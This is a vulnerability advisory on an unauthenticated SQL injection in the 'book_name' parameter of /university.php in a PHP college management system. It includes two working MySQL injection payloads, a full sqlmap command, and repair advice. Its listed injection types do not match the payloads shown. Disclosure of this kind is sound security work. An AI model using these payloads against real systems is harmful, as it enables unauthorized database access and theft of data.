# <font style="color:rgb(31, 35, 40);">Codezips College Management System In PHP With Source Code V1.0 /university.php SQL injection</font>
# NAME OF AFFECTED PRODUCT(S)
+ College Management System In PHP With Source Code

## Vendor Homepage
+ [homepage](https://codezips.com/php/college-management-system/)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /university.php

## Vulnerability location:
+ 'book_name' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://codeload.github.com/codezips/college-mgmt-php/zip/master)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/university.php' file of the 'College Management System In PHP With Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter 'book_name' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "College Management System In PHP With Source Code", WeQi discovered a critical SQL injection vulnerability in the "/university.php" file. This vulnerability stems from insufficient user input validation of the 'book_name' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ boolean-based blind
+ time-based blind

## Payload:
```plain
Parameter: book_name (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: book_name=111'||(SELECT 0x6f576a4a WHERE 8599=8599 AND (SELECT 8483 FROM(SELECT COUNT(*),CONCAT(0x71766a7871,(SELECT (ELT(8483=8483,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&book_author=111&search_book=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: book_name=111'||(SELECT 0x4d676b62 WHERE 6513=6513 AND (SELECT 9836 FROM (SELECT(SLEEP(5)))HmhY))||'&book_author=111&search_book=
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u "172.20.10.2:8111/university.php" --cookie="PHPSESSID=qfvbiq2ij3or64kmsl65f822ph" --data="book_name=111&book_author=111&search_book=" --batch --level=5 --risk=3 --dbms=mysql --random-agent --tamper=space2comment
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740730343433-260d94f0-398a-4841-a054-3c10c3c79e5d.png)

# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.

